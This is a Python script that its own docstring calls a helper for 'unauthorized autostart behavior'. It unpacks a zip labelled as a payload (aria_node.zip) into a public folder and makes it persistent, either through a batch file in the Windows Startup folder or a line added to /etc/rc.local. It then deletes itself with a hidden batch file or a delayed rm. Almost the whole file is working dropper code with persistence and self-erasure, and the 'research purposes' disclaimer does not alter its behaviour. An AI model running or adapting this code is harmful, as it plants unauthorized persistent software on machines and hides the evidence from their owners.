"""DISCLAIMER: This deployment helper enables unauthorized autostart behavior
and is provided strictly for research purposes only."""

import os
import zipfile
import shutil
import platform
import subprocess
import time

def extract_payload(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, "r") as zip_ref:
        zip_ref.extractall(extract_to)
    print(f"[🧬] Payload extracted to: {extract_to}")

def create_autostart_windows(target_dir):
    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft\Windows\Start Menu\Programs\Startup")
    bat_path = os.path.join(startup_path, "aria_autostart.bat")
    with open(bat_path, "w") as f:
        f.write(fr"cd /d {target_dir}\aria_node && python node.py")
    print(f"[🛠️] Autostart shortcut created at: {bat_path}")

def create_autostart_linux(target_dir):
    rc_path = "/etc/rc.local"
    entry = f"cd {target_dir}/aria_node && nohup python3 node.py &"
    try:
        with open(rc_path, "r+") as f:
            lines = f.readlines()
            if entry not in lines:
                lines.insert(-1, entry)
                f.seek(0)
                f.writelines(lines)
        print("[🛠️] rc.local autostart entry created.")
    except Exception as e:
        print(f"[!] Failed to write rc.local: {e}")


def install_payload(zip_path="aria_node.zip", target_path=r"C:\\Users\\Public\\Aria"):

    os.makedirs(target_path, exist_ok=True)
    extract_payload(zip_path, target_path)
    if platform.system() == "Windows":
        create_autostart_windows(target_path)
    else:
        create_autostart_linux(target_path)
    print("[✓] Deployment complete.")

def erase_self():
    script = os.path.realpath(__file__)
    if platform.system() == "Windows":
        bat = script.replace(".py", "_erase.bat")
        with open(bat, "w") as f:
            f.write(f"""@echo off
ping 127.0.0.1 -n 2 > nul
del "{script}"
del "%~f0"
""")
        subprocess.Popen(["cmd", "/c", bat], creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen(["bash", "-c", f"sleep 2 && rm '{script}'"], stdout=subprocess.DEVNULL)

if __name__ == "__main__":
    install_payload()
    erase_self()
